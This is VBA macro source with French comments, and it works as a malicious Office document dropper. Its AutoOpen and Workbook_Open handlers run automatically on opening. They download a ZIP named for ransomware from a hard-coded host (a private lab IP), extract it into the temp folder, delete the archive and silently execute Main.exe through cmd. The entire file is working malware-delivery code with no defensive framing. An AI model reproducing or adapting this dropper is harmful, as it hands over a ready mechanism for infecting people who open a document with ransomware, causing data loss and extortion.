Sub downloadRansonware()
    
    'Initialisation du chemin
    Set oShell = CreateObject("WScript.Shell")
    Path = oShell.ExpandEnvironmentStrings("%TEMP%")
    
    'Téléchargement du malware au format ZIP
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http://192.168.85.128/ransonware.zip", False
    xHttp.Send
    
        With bStrm
            .Type = 1 '//Au format Binaire
            .Open
            .write xHttp.responseBody
            .savetofile Path + "\ransonware.zip", 2 '//Overwrite si le fichier existe
        End With
    
    'Intialisation des Variables pour la fonction unzip
    Dim unzipFolder As String
    Dim folderName As Variant
    unzipFolder = Path
    zipFolderName = Path + "\ransonware.zip"
    
    'appelle de la foncton Unzip
    Call UnZip(unzipFolder, zipFolderName)
    
    'Suppression du dossier au format Zip
    Kill Path + "\ransonware.zip"
    
    'Commandes d'exécution du malware
    Dim command As String
    command = "cmd /K cd %TEMP%\ransonware\ & .\Main.exe"
    Set execShell = CreateObject("WScript.Shell")
    execShell.Run command, 0, False
    
End Sub

'Fonction Unzip
Sub UnZip(strTargetPath As String, Fname As Variant)
    'strTargetPath est le chemin ou l'archive doit être extrait
    'Fname est la combinaison du nom et chemin du fichier ZIP
    
    'Initialisation des variables
    Dim oApp As Object
    Dim FileNameFolder As Variant
 
    If Right(strTargetPath, 1) <> Application.PathSeparator Then
 
        strTargetPath = strTargetPath & Application.PathSeparator
 
    End If
    FileNameFolder = strTargetPath
    
    'Crée le dossier si il n'existe pas
    Set FSOobj = CreateObject("Scripting.FilesystemObject")
    If FSOobj.FolderExists(FileNameFolder) = False Then
        FSOobj.CreateFolder FileNameFolder
    End If
    
    'Copie des fichiers dans le nouveau dossier
    Set oApp = CreateObject("Shell.Application")
    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items
    
 
End Sub


'Ajoute la compatibilité PowerPoint et Excel,
'En utilisant les fonctions AutoOpen() et Workbook_Open()

Sub AutoOpen()
    downloadRansonware
End Sub

Sub Workbook_Open()
    downloadRansonware
End Sub
